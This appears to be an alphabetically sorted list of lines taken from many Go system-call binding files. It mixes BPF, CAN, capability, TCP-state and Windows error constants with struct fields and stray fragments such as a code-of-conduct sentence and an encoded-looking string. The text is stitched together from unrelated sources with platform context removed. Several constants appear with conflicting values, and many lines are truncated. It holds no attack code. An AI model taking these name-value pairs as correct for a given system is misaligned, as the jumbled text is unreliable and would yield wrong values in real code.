BPF_MAP_GET_NEXT_KEY                       = 0x4
BPF_MAP_LOOKUP_AND_DELETE_BATCH            = 0x19
BPF_MAP_LOOKUP_AND_DELETE_ELEM             = 0x15
BPF_MAP_LOOKUP_BATCH                       = 0x18
BPF_MAP_LOOKUP_ELEM                        = 0x1
BPF_MAP_TYPE_ARRAY                         = 0x2
BPF_MAP_TYPE_ARRAY_OF_MAPS                 = 0xc
BPF_MAP_TYPE_CGROUP_ARRAY                  = 0x8
BPF_MAP_TYPE_CGROUP_STORAGE                = 0x13
BPF_MAP_TYPE_CPUMAP                        = 0x10
BPF_MAP_TYPE_DEVMAP                        = 0xe
BPF_MAP_TYPE_DEVMAP_HASH                   = 0x19
BPF_MAP_TYPE_HASH                          = 0x1
BPF_MAP_TYPE_HASH_OF_MAPS                  = 0xd
BPF_MAP_TYPE_INODE_STORAGE                 = 0x1c
BPF_MAP_TYPE_LPM_TRIE                      = 0xb
BPF_MAP_TYPE_LRU_HASH                      = 0x9
BPF_MAP_TYPE_LRU_PERCPU_HASH               = 0xa
BPF_MAP_TYPE_PERCPU_ARRAY                  = 0x6
BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE         = 0x15
BPF_MAP_TYPE_PERCPU_HASH                   = 0x5
BPF_MAP_TYPE_PERF_EVENT_ARRAY              = 0x4
BPF_MAP_TYPE_PROG_ARRAY                    = 0x3
BPF_MAP_TYPE_QUEUE                         = 0x16
BPF_MAP_TYPE_REUSEPORT_SOCKARRAY           = 0x14
BPF_MAP_TYPE_RINGBUF                       = 0x1b
BPF_MAP_TYPE_SK_STORAGE                    = 0x18
BPF_MAP_TYPE_SOCKHASH                      = 0x12
BPF_MAP_TYPE_SOCKMAP                       = 0xf
BPF_MAP_TYPE_STACK                         = 0x17
BPF_MAP_TYPE_STACK_TRACE                   = 0x7
BPF_MAP_TYPE_STRUCT_OPS                    = 0x1a
BPF_MAP_TYPE_UNSPEC                        = 0x0
BPF_MAP_TYPE_XSKMAP                        = 0x11
BPF_MAP_UPDATE_BATCH                       = 0x1a
BPF_MAP_UPDATE_ELEM                        = 0x2
BPF_MAXBUFSIZE                          = 0x80000
BPF_MAXBUFSIZE                    = 0x1000000
BPF_MAXBUFSIZE                    = 0x200000
BPF_MAXBUFSIZE                    = 0x80000
BPF_MAXBUFSIZE                 = 0x80000
BPF_MAXBUFSIZE                = 0x1000000
BPF_MAXINSNS                                = 0x1000
BPF_MAXINSNS                            = 0x200
BPF_MAXINSNS                      = 0x200
BPF_MAXINSNS                   = 0x200
BPF_MAXINSNS                  = 0x200
BPF_MAX_CLONES                    = 0x80
BPF_MEM                                     = 0x60
BPF_MEM                                 = 0x60
BPF_MEM                           = 0x60
BPF_MEM                        = 0x60
BPF_MEM                       = 0x60
BPF_MEMWORDS                                = 0x10
BPF_MEMWORDS                            = 0x10
BPF_MEMWORDS                      = 0x10
BPF_MEMWORDS                   = 0x10
BPF_MEMWORDS                  = 0x10
BPF_MINBUFSIZE                          = 0x20
BPF_MINBUFSIZE                    = 0x20
BPF_MINBUFSIZE                 = 0x20
BPF_MINBUFSIZE                = 0x20
BPF_MINOR_VERSION                           = 0x1
BPF_MINOR_VERSION                       = 0x1
BPF_MINOR_VERSION                 = 0x1
BPF_MINOR_VERSION              = 0x1
BPF_MINOR_VERSION             = 0x1
BPF_MISC                                    = 0x7
BPF_MISC                                = 0x7
BPF_MISC                          = 0x7
BPF_MISC                       = 0x7
BPF_MISC                      = 0x7
BPF_MOD                                     = 0x90
BPF_MOD                           = 0x90
BPF_MOD                        = 0x90
BPF_MODIFY_RETURN                          = 0x1a
BPF_MOV                                     = 0xb0
BPF_MSH                                     = 0xa0
BPF_MSH                                 = 0xa0
BPF_MSH                           = 0xa0
BPF_MSH                        = 0xa0
BPF_MSH                       = 0xa0
BPF_MUL                                     = 0x20
BPF_MUL                                 = 0x20
BPF_MUL                           = 0x20
BPF_MUL                        = 0x20
BPF_MUL                       = 0x20
BPF_NEG                                     = 0x80
BPF_NEG                                 = 0x80
BPF_NEG                           = 0x80
BPF_NEG                        = 0x80
BPF_NEG                       = 0x80
BPF_NET_OFF                                 = -0x100000
BPF_NOEXIST                                = 0x1
BPF_OBJ_GET                                = 0x7
BPF_OBJ_GET_INFO_BY_FD                     = 0xf
BPF_OBJ_NAME_LEN                            = 0x10
BPF_OBJ_PIN                                = 0x6
BPF_OK                                     = 0x0
BPF_OR                                      = 0x40
BPF_OR                                  = 0x40
BPF_OR                            = 0x40
BPF_OR                         = 0x40
BPF_OR                        = 0x40
BPF_PROG_ATTACH                            = 0x8
BPF_PROG_BIND_MAP                          = 0x23
BPF_PROG_DETACH                            = 0x9
BPF_PROG_GET_FD_BY_ID                      = 0xd
BPF_PROG_GET_NEXT_ID                       = 0xb
BPF_PROG_LOAD                              = 0x5
BPF_PROG_QUERY                             = 0x10
BPF_PROG_TEST_RUN                          = 0xa
BPF_PROG_TYPE_CGROUP_DEVICE                = 0xf
BPF_PROG_TYPE_CGROUP_SKB                   = 0x8
BPF_PROG_TYPE_CGROUP_SOCK                  = 0x9
BPF_PROG_TYPE_CGROUP_SOCKOPT               = 0x19
BPF_PROG_TYPE_CGROUP_SOCK_ADDR             = 0x12
BPF_PROG_TYPE_CGROUP_SYSCTL                = 0x17
BPF_PROG_TYPE_EXT                          = 0x1c
BPF_PROG_TYPE_FLOW_DISSECTOR               = 0x16
BPF_PROG_TYPE_KPROBE                       = 0x2
BPF_PROG_TYPE_LIRC_MODE2                   = 0x14
BPF_PROG_TYPE_LSM                          = 0x1d
BPF_PROG_TYPE_LWT_IN                       = 0xa
BPF_PROG_TYPE_LWT_OUT                      = 0xb
BPF_PROG_TYPE_LWT_SEG6LOCAL                = 0x13
BPF_PROG_TYPE_LWT_XMIT                     = 0xc
BPF_PROG_TYPE_PERF_EVENT                   = 0x7
BPF_PROG_TYPE_RAW_TRACEPOINT               = 0x11
BPF_PROG_TYPE_RAW_TRACEPOINT_WRITABLE      = 0x18
BPF_PROG_TYPE_SCHED_ACT                    = 0x4
BPF_PROG_TYPE_SCHED_CLS                    = 0x3
BPF_PROG_TYPE_SK_LOOKUP                    = 0x1e
BPF_PROG_TYPE_SK_MSG                       = 0x10
BPF_PROG_TYPE_SK_REUSEPORT                 = 0x15
BPF_PROG_TYPE_SK_SKB                       = 0xe
BPF_PROG_TYPE_SOCKET_FILTER                = 0x1
BPF_PROG_TYPE_SOCK_OPS                     = 0xd
BPF_PROG_TYPE_STRUCT_OPS                   = 0x1b
BPF_PROG_TYPE_TRACEPOINT                   = 0x5
BPF_PROG_TYPE_TRACING                      = 0x1a
BPF_PROG_TYPE_UNSPEC                       = 0x0
BPF_PROG_TYPE_XDP                          = 0x6
BPF_PSEUDO_BTF_ID                           = 0x3
BPF_PSEUDO_CALL                             = 0x1
BPF_PSEUDO_FUNC                             = 0x4
BPF_PSEUDO_KFUNC_CALL                       = 0x2
BPF_PSEUDO_MAP_FD                           = 0x1
BPF_PSEUDO_MAP_IDX                          = 0x5
BPF_PSEUDO_MAP_IDX_VALUE                    = 0x6
BPF_PSEUDO_MAP_VALUE                        = 0x2
BPF_RAW_TRACEPOINT_OPEN                    = 0x11
BPF_RB_AVAIL_DATA                          = 0x0
BPF_RB_CONS_POS                            = 0x2
BPF_RB_FORCE_WAKEUP                        = 0x2
BPF_RB_NO_WAKEUP                           = 0x1
BPF_RB_PROD_POS                            = 0x3
BPF_RB_RING_SIZE                           = 0x1
BPF_REDIRECT                               = 0x7
BPF_REG_0                                  = 0x0
BPF_REG_1                                  = 0x1
BPF_REG_10                                 = 0xa
BPF_REG_2                                  = 0x2
BPF_REG_3                                  = 0x3
BPF_REG_4                                  = 0x4
BPF_REG_5                                  = 0x5
BPF_REG_6                                  = 0x6
BPF_REG_7                                  = 0x7
BPF_REG_8                                  = 0x8
BPF_REG_9                                  = 0x9
BPF_RELEASE                             = 0x30bb6
BPF_RELEASE                       = 0x30bb6
BPF_RELEASE                    = 0x30bb6
BPF_RELEASE                   = 0x30bb6
BPF_RET                                     = 0x6
BPF_RET                                 = 0x6
BPF_RET                           = 0x6
BPF_RET                        = 0x6
BPF_RET                       = 0x6
BPF_RINGBUF_BUSY_BIT                       = 0x80000000
BPF_RINGBUF_DISCARD_BIT                    = 0x40000000
BPF_RINGBUF_HDR_SZ                         = 0x8
BPF_RSH                                     = 0x70
BPF_RSH                                 = 0x70
BPF_RSH                           = 0x70
BPF_RSH                        = 0x70
BPF_RSH                       = 0x70
BPF_SK_LOOKUP                              = 0x24
BPF_SK_LOOKUP_F_NO_REUSEPORT               = 0x2
BPF_SK_LOOKUP_F_REPLACE                    = 0x1
BPF_SK_MSG_VERDICT                         = 0x7
BPF_SK_SKB_STREAM_PARSER                   = 0x4
BPF_SK_SKB_STREAM_VERDICT                  = 0x5
BPF_SK_STORAGE_GET_F_CREATE                = 0x1
BPF_SOCK_OPS_ACTIVE_ESTABLISHED_CB         = 0x4
BPF_SOCK_OPS_ALL_CB_FLAGS                  = 0x7f
BPF_SOCK_OPS_BASE_RTT                      = 0x7
BPF_SOCK_OPS_HDR_OPT_LEN_CB                = 0xe
BPF_SOCK_OPS_NEEDS_ECN                     = 0x6
BPF_SOCK_OPS_PARSE_ALL_HDR_OPT_CB_FLAG     = 0x10
BPF_SOCK_OPS_PARSE_HDR_OPT_CB              = 0xd
BPF_SOCK_OPS_PARSE_UNKNOWN_HDR_OPT_CB_FLAG = 0x20
BPF_SOCK_OPS_PASSIVE_ESTABLISHED_CB        = 0x5
BPF_SOCK_OPS_RETRANS_CB                    = 0x9
BPF_SOCK_OPS_RETRANS_CB_FLAG               = 0x2
BPF_SOCK_OPS_RTO_CB                        = 0x8
BPF_SOCK_OPS_RTO_CB_FLAG                   = 0x1
BPF_SOCK_OPS_RTT_CB                        = 0xc
BPF_SOCK_OPS_RTT_CB_FLAG                   = 0x8
BPF_SOCK_OPS_RWND_INIT                     = 0x2
BPF_SOCK_OPS_STATE_CB                      = 0xa
BPF_SOCK_OPS_STATE_CB_FLAG                 = 0x4
BPF_SOCK_OPS_TCP_CONNECT_CB                = 0x3
BPF_SOCK_OPS_TCP_LISTEN_CB                 = 0xb
BPF_SOCK_OPS_TIMEOUT_INIT                  = 0x1
BPF_SOCK_OPS_VOID                          = 0x0
BPF_SOCK_OPS_WRITE_HDR_OPT_CB              = 0xf
BPF_SOCK_OPS_WRITE_HDR_OPT_CB_FLAG         = 0x40
BPF_ST                                      = 0x2
BPF_ST                                  = 0x2
BPF_ST                            = 0x2
BPF_ST                         = 0x2
BPF_ST                        = 0x2
BPF_STACK_BUILD_ID_EMPTY                   = 0x0
BPF_STACK_BUILD_ID_IP                      = 0x2
BPF_STACK_BUILD_ID_VALID                   = 0x1
BPF_STATS_RUN_TIME                         = 0x0
BPF_STX                                     = 0x3
BPF_STX                                 = 0x3
BPF_STX                           = 0x3
BPF_STX                        = 0x3
BPF_STX                       = 0x3
BPF_SUB                                     = 0x10
BPF_SUB                                 = 0x10
BPF_SUB                           = 0x10
BPF_SUB                        = 0x10
BPF_SUB                       = 0x10
BPF_TAG_SIZE                                = 0x8
BPF_TASK_FD_QUERY                          = 0x14
BPF_TAX                                     = 0x0
BPF_TAX                                 = 0x0
BPF_TAX                           = 0x0
BPF_TAX                        = 0x0
BPF_TAX                       = 0x0
BPF_TCP_CLOSE                              = 0x7
BPF_TCP_CLOSE        = 1
BPF_TCP_CLOSE_WAIT                         = 0x8
BPF_TCP_CLOSE_WAIT   = 8
BPF_TCP_CLOSING                            = 0xb
BPF_TCP_CLOSING      = 10
BPF_TCP_ESTABLISHED                        = 0x1
BPF_TCP_ESTABLISHED  = 5
BPF_TCP_FIN_WAIT1                          = 0x4
BPF_TCP_FIN_WAIT1    = 6
BPF_TCP_FIN_WAIT2                          = 0x5
BPF_TCP_FIN_WAIT2    = 7
BPF_TCP_LAST_ACK                           = 0x9
BPF_TCP_LAST_ACK     = 9
BPF_TCP_LISTEN                             = 0xa
BPF_TCP_LISTEN       = 2
BPF_TCP_MAX_STATES                         = 0xd
BPF_TCP_MAX_STATES   = -2
BPF_TCP_NEW_SYN_RECV                       = 0xc
BPF_TCP_NEW_SYN_RECV = -1
BPF_TCP_SYN_RECV                           = 0x3
BPF_TCP_SYN_RECV     = 4
BPF_TCP_SYN_SENT                           = 0x2
BPF_TCP_SYN_SENT     = 3
BPF_TCP_TIME_WAIT                          = 0x6
BPF_TCP_TIME_WAIT    = 11
BPF_TO_BE                                   = 0x8
BPF_TO_LE                                   = 0x0
BPF_TRACE_FENTRY                           = 0x18
BPF_TRACE_FEXIT                            = 0x19
BPF_TRACE_ITER                             = 0x1c
BPF_TRACE_RAW_TP                           = 0x17
BPF_TXA                                     = 0x80
BPF_TXA                                 = 0x80
BPF_TXA                           = 0x80
BPF_TXA                        = 0x80
BPF_TXA                       = 0x80
BPF_T_BINTIME                  = 0x2
BPF_T_BINTIME_FAST             = 0x102
BPF_T_BINTIME_MONOTONIC        = 0x202
BPF_T_BINTIME_MONOTONIC_FAST   = 0x302
BPF_T_FAST                     = 0x100
BPF_T_FLAG_MASK                = 0x300
BPF_T_FORMAT_MASK              = 0x3
BPF_T_MICROTIME                = 0x0
BPF_T_MICROTIME_FAST           = 0x100
BPF_T_MICROTIME_MONOTONIC      = 0x200
BPF_T_MICROTIME_MONOTONIC_FAST = 0x300
BPF_T_MONOTONIC                = 0x200
BPF_T_MONOTONIC_FAST           = 0x300
BPF_T_NANOTIME                 = 0x1
BPF_T_NANOTIME_FAST            = 0x101
BPF_T_NANOTIME_MONOTONIC       = 0x201
BPF_T_NANOTIME_MONOTONIC_FAST  = 0x301
BPF_T_NONE                     = 0x3
BPF_T_NORMAL                   = 0x0
BPF_W                                       = 0x0
BPF_W                                   = 0x0
BPF_W                             = 0x0
BPF_W                          = 0x0
BPF_W                         = 0x0
BPF_WRITE_HDR_TCP_CURRENT_MSS              = 0x1
BPF_WRITE_HDR_TCP_SYNACK_COOKIE            = 0x2
BPF_X                                       = 0x8
BPF_X                                   = 0x8
BPF_X                             = 0x8
BPF_X                          = 0x8
BPF_X                         = 0x8
BPF_XADD                                    = 0xc0
BPF_XCHG                                    = 0xe1
BPF_XDP                                    = 0x25
BPF_XDP_CPUMAP                             = 0x23
BPF_XDP_DEVMAP                             = 0x21
BPF_XOR                                     = 0xa0
BPF_XOR                           = 0xa0
BPF_XOR                        = 0xa0
BRKINT                                      = 0x2
BRKINT                                  = 0x2
BRKINT                            = 0x2
BRKINT                          = 0x0001
BRKINT                         = 0x2
BRKINT                        = 0x2
BS0                                         = 0x0
BS0                                     = 0x0
BS0                           = 0x0
BS1                                     = 0x8000
BS1                              = 0x2000
BS1                              = 0x8000
BS1                           = 0x1000
BS1                           = 0x2000
BSD based systems
BSDLY                                   = 0x8000
BSDLY                            = 0x2000
BSDLY                            = 0x8000
BSDLY                         = 0x1000
BSDLY                         = 0x2000
BTHPROTO_RFCOMM = 3
BTPROTO_AVDTP  = 7
BTPROTO_BNEP   = 4
BTPROTO_CMTP   = 5
BTPROTO_HCI    = 1
BTPROTO_HIDP   = 6
BTPROTO_L2CAP  = 0
BTPROTO_RFCOMM = 3
BTPROTO_SCO    = 2
BTRFS_SUPER_MAGIC                           = 0x9123683e
BTRFS_TEST_MAGIC                            = 0x73727279
BT_E_SPURIOUS_ACTIVATION                                                  Handle        = 0x80080300
BUF$
BUG FIXES:
BUS_(USB
BUS_BLUETOOTH                               = 0x5
BUS_HIL                                     = 0x4
BUS_USB                                     = 0x3
BUS_VIRTUAL                                 = 0x6
BYTE
B[0-9_]
Backoff        uint8
Badblocks uint32
Badv     uint64
Badvaddr uint64
Band      uint32
Base 
Base    int32
Base uintptr
BaseAddress       uintptr
BaseOfDll   uintptr
BasePri        int32
BasePriority                 int32
Basetype [16]int8
Bash
Bash:
BashCompCustom
BashCompFilenameExt
BashCompSubdirsInDir
BashCompletionFunction
BashCompletionFunction string
BasicLimitInformation JOBOBJECT_BASIC_LIMIT_INFORMATION
Baudrate     uint64
Baudrate    uint32
Baudrate    uint64
Baudrate   uint32
Baudrate   uint64
Bavail      int64
Bavail      uint64
Bavail    uint32
Bavail    uint64
Bavail   uint64
Bavail  uint64
Bbtblocks uint32
Bdaddr      [6]uint8
Bdaddr  [6]uint8
Bdaddr_type uint8
Be kind and respectful to the members of the community. Take time to educate
BeginAddress uint32
BeingDebugged          byte
Bfree       int64
Bfree       uint64
Bfree     uint32
Bfree     uint64
Bfree    uint64
Bfree   uint64
BgZ4svzjfabn8ERpuB4JI4N6/rdy1iusx77G3oU=
Bias         int32
BinaryName      string
BinaryPathName   
BitField               byte
Bitrate      uint32
Bits               uint64
Bits [1024]int64
Bits [16]int64
Bits [16]uint64
Bits [2048]int32
Bits [32]int32
Bits [32]uint32
Bits [64]int32
Bits [8]uint32
Blink 
Blk_len             uint32
Blkio_count               uint64
Blkio_delay_total         uint64
Blksize         uint32
Blksize        uint32
Blksize      int32
Blksize    uint32
Blksize  int32
Blksize  int64
Blksize int32
Blksize int64
Blksize uint32
Block_nr         uint32
Block_nr   uint32
Block_size       uint32
Block_size     uint32
Block_size uint32
Block_status        uint32
Blocks          uint64
Blocks         int64
Blocks      int64
Blocks      uint64
Blocks     int64
Blocks    int64
Blocks    uint32
Blocks    uint64
Blocks   int32
Blocks   int64
Blocks   uint64
Blocks  int64
Blocks  uint64
Blocksize   uint32
Blocksize  uint32
Boolean shorthand flags can be combined with other shorthand flags.
Bottom int16
Bp_type            uint32
BpfInsn
Bpf_fd int32
Branch_sample_type uint64
Bresvd      uint64
BroadcastAddress SockaddrGen
Brp          uint32
Brp_inc   uint32
Brp_max   uint32
Brp_min   uint32
Bsize       int64
Bsize       uint32
Bsize       uint64
Bsize     uint32
Bsize     uint64
Bsize    uint64
Bsize   int32
Bsize   int64
Bsize   uint32
Bsize   uint64
Btim    Timespec
Btime           StatxTimestamp
Buf 
Buf    
Buf       
Buf:    (
Buf: (
Buf_size       uint16
Buf_type       uint16
Bufa   
Bufb   
Buffer 
Buffer        
BufferCount uint32
Bufferram uint32
Bufferram uint64
Buffers     
Buflen uint32
Buflen uint64
BuildNumber       uint32
Bus_error        uint32
Bus_info     [32]byte
Bus_off          uint32
Bustype uint32
ByHandleFileInformation) (err error)
ByHandleFileInformation) (err error) {
Bytes uint32
Bytes_deduped uint64
Bytesalloc int64
C(LOCAL
C.exit(C.int(code))
C.sync()
CACHE_E_FIRST                                                             syscall.Errno = 0x80040170
CACHE_E_LAST                                                              syscall.Errno = 0x8004017F
CACHE_E_NOCACHE_UPDATED                                                   Handle        = 0x80040170
CACHE_S_FIRST                                                             syscall.Errno = 0x00040170
CACHE_S_FORMATETC_NOTSUPPORTED                                            Handle        = 0x00040170
CACHE_S_LAST                                                              syscall.Errno = 0x0004017F
CACHE_S_SAMECACHE                                                         Handle        = 0x00040171
CACHE_S_SOMECACHES_NOTUPDATED                                             Handle        = 0x00040172
CALL
CANON
CAN_/ 
CAN_BCM                                     = 0x2
CAN_CTRLMODE_3_SAMPLES                      = 0x4
CAN_CTRLMODE_BERR_REPORTING                 = 0x10
CAN_CTRLMODE_CC_LEN8_DLC                    = 0x100
CAN_CTRLMODE_FD                             = 0x20
CAN_CTRLMODE_FD_NON_ISO                     = 0x80
CAN_CTRLMODE_LISTENONLY                     = 0x2
CAN_CTRLMODE_LOOPBACK                       = 0x1
CAN_CTRLMODE_ONE_SHOT                       = 0x8
CAN_CTRLMODE_PRESUME_ACK                    = 0x40
CAN_CTRLMODE_TDC_AUTO                       = 0x200
CAN_CTRLMODE_TDC_MANUAL                     = 0x400
CAN_EFF_FLAG                                = 0x80000000
CAN_EFF_ID_BITS                             = 0x1d
CAN_EFF_MASK                                = 0x1fffffff
CAN_ERR_ACK                                 = 0x20
CAN_ERR_BUSERROR                            = 0x80
CAN_ERR_BUSOFF                              = 0x40
CAN_ERR_CRTL                                = 0x4
CAN_ERR_CRTL_ACTIVE                         = 0x40
CAN_ERR_CRTL_RX_OVERFLOW                    = 0x1
CAN_ERR_CRTL_RX_PASSIVE                     = 0x10
CAN_ERR_CRTL_RX_WARNING                     = 0x4
CAN_ERR_CRTL_TX_OVERFLOW                    = 0x2
CAN_ERR_CRTL_TX_PASSIVE                     = 0x20
CAN_ERR_CRTL_TX_WARNING                     = 0x8
CAN_ERR_CRTL_UNSPEC                         = 0x0
CAN_ERR_DLC                                 = 0x8
CAN_ERR_FLAG                                = 0x20000000
CAN_ERR_LOSTARB                             = 0x2
CAN_ERR_LOSTARB_UNSPEC                      = 0x0
CAN_ERR_MASK                                = 0x1fffffff
CAN_ERR_PROT                                = 0x8
CAN_ERR_PROT_ACTIVE                         = 0x40
CAN_ERR_PROT_BIT                            = 0x1
CAN_ERR_PROT_BIT0                           = 0x8
CAN_ERR_PROT_BIT1                           = 0x10
CAN_ERR_PROT_FORM                           = 0x2
CAN_ERR_PROT_LOC_ACK                        = 0x19
CAN_ERR_PROT_LOC_ACK_DEL                    = 0x1b
CAN_ERR_PROT_LOC_CRC_DEL                    = 0x18
CAN_ERR_PROT_LOC_CRC_SEQ                    = 0x8
CAN_ERR_PROT_LOC_DATA                       = 0xa
CAN_ERR_PROT_LOC_DLC                        = 0xb
CAN_ERR_PROT_LOC_EOF                        = 0x1a
CAN_ERR_PROT_LOC_ID04_00                    = 0xe
CAN_ERR_PROT_LOC_ID12_05                    = 0xf
CAN_ERR_PROT_LOC_ID17_13                    = 0x7
CAN_ERR_PROT_LOC_ID20_18                    = 0x6
CAN_ERR_PROT_LOC_ID28_21                    = 0x2
CAN_ERR_PROT_LOC_IDE                        = 0x5
CAN_ERR_PROT_LOC_INTERM                     = 0x12
CAN_ERR_PROT_LOC_RES0                       = 0x9
CAN_ERR_PROT_LOC_RES1                       = 0xd
CAN_ERR_PROT_LOC_RTR                        = 0xc
CAN_ERR_PROT_LOC_SOF                        = 0x3
CAN_ERR_PROT_LOC_SRTR                       = 0x4
CAN_ERR_PROT_LOC_UNSPEC                     = 0x0
CAN_ERR_PROT_OVERLOAD                       = 0x20
CAN_ERR_PROT_STUFF                          = 0x4
CAN_ERR_PROT_TX                             = 0x80
CAN_ERR_PROT_UNSPEC                         = 0x0
CAN_ERR_RESTARTED                           = 0x100
CAN_ERR_TRX                                 = 0x10
CAN_ERR_TRX_CANH_NO_WIRE                    = 0x4
CAN_ERR_TRX_CANH_SHORT_TO_BAT               = 0x5
CAN_ERR_TRX_CANH_SHORT_TO_GND               = 0x7
CAN_ERR_TRX_CANH_SHORT_TO_VCC               = 0x6
CAN_ERR_TRX_CANL_NO_WIRE                    = 0x40
CAN_ERR_TRX_CANL_SHORT_TO_BAT               = 0x50
CAN_ERR_TRX_CANL_SHORT_TO_CANH              = 0x80
CAN_ERR_TRX_CANL_SHORT_TO_GND               = 0x70
CAN_ERR_TRX_CANL_SHORT_TO_VCC               = 0x60
CAN_ERR_TRX_UNSPEC                          = 0x0
CAN_ERR_TX_TIMEOUT                          = 0x1
CAN_INV_FILTER                              = 0x20000000
CAN_ISOTP                                   = 0x6
CAN_J1939                                   = 0x7
CAN_MAX_DLC                                 = 0x8
CAN_MAX_DLEN                                = 0x8
CAN_MAX_RAW_DLC                             = 0xf
CAN_MCNET                                   = 0x5
CAN_MTU                                     = 0x10
CAN_NPROTO                                  = 0x8
CAN_RAW                                     = 0x1
CAN_RAW_ERR_FILTER    = 0x2
CAN_RAW_FD_FRAMES     = 0x5
CAN_RAW_FILTER        = 0x1
CAN_RAW_FILTER_MAX                          = 0x200
CAN_RAW_JOIN_FILTERS  = 0x6
CAN_RAW_LOOPBACK      = 0x3
CAN_RAW_RECV_OWN_MSGS = 0x4
CAN_RTR_FLAG                                = 0x40000000
CAN_SFF_ID_BITS                             = 0xb
CAN_SFF_MASK                                = 0x7ff
CAN_STATE_BUS_OFF       = 0x3
CAN_STATE_ERROR_ACTIVE  = 0x0
CAN_STATE_ERROR_PASSIVE = 0x2
CAN_STATE_ERROR_WARNING = 0x1
CAN_STATE_MAX           = 0x6
CAN_STATE_SLEEPING      = 0x5
CAN_STATE_STOPPED       = 0x4
CAN_TERMINATION_DISABLED                    = 0x0
CAN_TP16                                    = 0x3
CAN_TP20                                    = 0x4
CAP_/ 
CAP_AACCT                     = 0x6
CAP_ACCEPT                     = 0x200000020000000
CAP_ACL_CHECK                  = 0x400000000010000
CAP_ACL_DELETE                 = 0x400000000020000
CAP_ACL_GET                    = 0x400000000040000
CAP_ACL_SET                    = 0x400000000080000
CAP_ALL0                       = 0x20007ffffffffff
CAP_ALL1                       = 0x4000000001fffff
CAP_ARM_APPLICATION           = 0x5
CAP_AUDIT_CONTROL                           = 0x1e
CAP_AUDIT_READ                              = 0x25
CAP_AUDIT_WRITE                             = 0x1d
CAP_BIND                       = 0x200000040000000
CAP_BINDAT                     = 0x200008000000400
CAP_BLOCK_SUSPEND                           = 0x24
CAP_BPF                                     = 0x27
CAP_BYPASS_RAC_VMM            = 0x3
CAP_CHECKPOINT_RESTORE                      = 0x28
CAP_CHFLAGSAT                  = 0x200000000001400
CAP_CHOWN                                   = 0x0
CAP_CLEAR                     = 0x0
CAP_CONNECT                    = 0x200000080000000
CAP_CONNECTAT                  = 0x200010000000400
CAP_CREATE                     = 0x200000000000040
CAP_CREDENTIALS               = 0x7
CAP_DAC_OVERRIDE                            = 0x1
CAP_DAC_READ_SEARCH                         = 0x2
CAP_EFFECTIVE                 = 0x1
CAP_EVENT                      = 0x400000000000020
CAP_EWLM_AGENT                = 0x4
CAP_EXTATTR_DELETE             = 0x400000000001000
CAP_EXTATTR_GET                = 0x400000000002000
CAP_EXTATTR_LIST               = 0x400000000004000
CAP_EXTATTR_SET                = 0x400000000008000
CAP_FCHDIR                     = 0x200000000000800
CAP_FCHFLAGS                   = 0x200000000001000
CAP_FCHMOD                     = 0x200000000002000
CAP_FCHMODAT                   = 0x200000000002400
CAP_FCHOWN                     = 0x200000000004000
CAP_FCHOWNAT                   = 0x200000000004400
CAP_FCNTL                      = 0x200000000008000
CAP_FCNTL_ALL                  = 0x78
CAP_FCNTL_GETFL                = 0x8
CAP_FCNTL_GETOWN               = 0x20
CAP_FCNTL_SETFL                = 0x10
CAP_FCNTL_SETOWN               = 0x40
CAP_FEXECVE                    = 0x200000000000080
CAP_FLOCK                      = 0x200000000010000
CAP_FOWNER                                  = 0x3
CAP_FPATHCONF                  = 0x200000000020000
CAP_FSCK                       = 0x200000000040000
CAP_FSETID                                  = 0x4
CAP_FSTAT                      = 0x200000000080000
CAP_FSTATAT                    = 0x200000000080400
CAP_FSTATFS                    = 0x200000000100000
CAP_FSYNC                      = 0x200000000000100
CAP_FTRUNCATE                  = 0x200000000000200
CAP_FUTIMES                    = 0x200000000200000
CAP_FUTIMESAT                  = 0x200000000200400
CAP_GETPEERNAME                = 0x200000100000000
CAP_GETSOCKNAME                = 0x200000200000000
CAP_GETSOCKOPT                 = 0x200000400000000
CAP_INHERITABLE               = 0x2
CAP_IOCTL                      = 0x400000000000080
CAP_IOCTLS_ALL                 = 0x7fffffff
CAP_IOCTLS_ALL                 = 0x7fffffffffffffff
CAP_IPC_LOCK                                = 0xe
CAP_IPC_OWNER                               = 0xf
CAP_KILL                                    = 0x5
CAP_KQUEUE                     = 0x400000000100040
CAP_KQUEUE_CHANGE              = 0x400000000100000
CAP_KQUEUE_EVENT               = 0x400000000000040
CAP_LAST_CAP                                = 0x28
CAP_LEASE                                   = 0x1c
CAP_LINKAT_SOURCE              = 0x200020000000400
CAP_LINKAT_TARGET              = 0x200000000400400
CAP_LINUX_IMMUTABLE                         = 0x9
CAP_LISTEN                     = 0x200000800000000
CAP_LOOKUP                     = 0x200000000000400
CAP_MAC_ADMIN                               = 0x21
CAP_MAC_GET                    = 0x400000000000001
CAP_MAC_OVERRIDE                            = 0x20
CAP_MAC_SET                    = 0x400000000000002
CAP_MAXIMUM                   = 0x7
CAP_MKDIRAT                    = 0x200000000800400
CAP_MKFIFOAT                   = 0x200000001000400
CAP_MKNOD                                   = 0x1b
CAP_MKNODAT                    = 0x200000002000400
CAP_MMAP                       = 0x200000000000010
CAP_MMAP_R                     = 0x20000000000001d
CAP_MMAP_RW                    = 0x20000000000001f
CAP_MMAP_RWX                   = 0x20000000000003f
CAP_MMAP_RX                    = 0x20000000000003d
CAP_MMAP_W                     = 0x20000000000001e
CAP_MMAP_WX                    = 0x20000000000003e
CAP_MMAP_X                     = 0x20000000000003c
CAP_NET_ADMIN                               = 0xc
CAP_NET_BIND_SERVICE                        = 0xa
CAP_NET_BROADCAST                           = 0xb
CAP_NET_RAW                                 = 0xd
CAP_NUMA_ATTACH               = 0x2
CAP_PDGETPID                   = 0x400000000000200
CAP_PDKILL                     = 0x400000000000800
CAP_PDWAIT                     = 0x400000000000400
CAP_PEELOFF                    = 0x200001000000000
CAP_PERFMON                                 = 0x26
CAP_PERMITTED                 = 0x3
CAP_POLL_EVENT                 = 0x400000000000020
CAP_PREAD                      = 0x20000000000000d
CAP_PROPAGATE                 = 0x1
CAP_PROPOGATE                 = 0x1
CAP_PWRITE                     = 0x20000000000000e
CAP_READ                       = 0x200000000000001
CAP_RECV                       = 0x200000000000001
CAP_RENAMEAT_SOURCE            = 0x200000004000400
CAP_RENAMEAT_TARGET            = 0x200040000000400
CAP_RIGHTS_VERSION             = 0x0
CAP_RIGHTS_VERSION_00          = 0x0
CAP_SEEK                       = 0x20000000000000c
CAP_SEEK_TELL                  = 0x200000000000004
CAP_SEM_GETVALUE               = 0x400000000000004
CAP_SEM_POST                   = 0x400000000000008
CAP_SEM_WAIT                   = 0x400000000000010
CAP_SEND                       = 0x200000000000002
CAP_SET                       = 0x1
CAP_SETFCAP                                 = 0x1f
CAP_SETGID                                  = 0x6
